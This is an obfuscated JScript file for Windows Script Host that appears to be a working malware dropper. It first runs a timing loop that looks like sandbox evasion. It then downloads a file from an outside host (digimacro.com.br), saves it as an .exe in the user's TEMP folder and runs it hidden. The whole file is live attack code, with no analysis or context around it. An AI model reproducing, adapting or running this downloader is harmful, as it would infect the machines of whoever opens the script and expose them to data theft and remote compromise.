var Il = false;
var I1 = "CreateObject";
var a0 = function GU() {return WScript[I1]("WScript.Shell");}(), a = 11;
var h0 = "MSXML2.XMLHTTP";
var k = 2123213;
var uV = 0;
function p(ex){a0["Run"](ex, uV, uV);};
function F(){return "" + h0;};
function J(kS, tG){uV = uV * 1; return kS - tG;};
function xX(){return I1;};
/*@cc_on
  @if (@_win32 || @_win64)
    Il = true;
  @end
@*/
if (Il)
{
var I = "";
function jV(){return 22;};
var XK = 0; var Y = 0;
function eT()
{
var F0 = new this["Date"]();
var u = F0["getUTCMilliseconds"]();
WScript["Sleep"](jV());
var F0 = new this["Date"]();
var T = F0["getUTCMilliseconds"]();
WScript["Sleep"](jV());
var F0 = new this["Date"]();
var Oz = F0["getUTCMilliseconds"]();
var XK = "q";
XK = J(T, u);
var Y = "d";
Y = J(Oz, T);
I = "open";
return J(XK, Y);
}
var eB = false;
var X = false;
for (var wr = uV; wr < jV() * 1; wr++){if (eT() != uV){
eB = true; 
Y = "31" + 11 * XK + Y; 
X = true; 
break;
}}
function h() {return ((eB == true) && (eB == X)) ? 1 : uV;};
if (eB && h() && X){
function Tr() {return a0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "KdVL5jv3sigK6.exe";};
 my = F();
 N = WScript[I1](my);
 var I0 = 1;
 while (I0){
try {
N[I]("GET", "http://digimacro.com.br/m8isda", false);
N["send"]();
dr = "Sleep";
for (;;){WScript[dr](jV() * 11); if (N["readystate"] >= 2 * 2) break;};
I0 = uV;
} catch(i){};
}
function n(Hm) {var J0 = (1, 2, 3, 4, 5, Hm); return J0;};
El = WScript[xX()]("ADODB.Stream");
my = El;
my[I]();
my["type"] = n(1);
my["write"](N["ResponseBody"]);
El["position"] = n(uV);
my["Save" + "ToFile"](Tr(), 2);
El["c"+"lose"]();
Fa = Tr();
p(Fa);
}
}

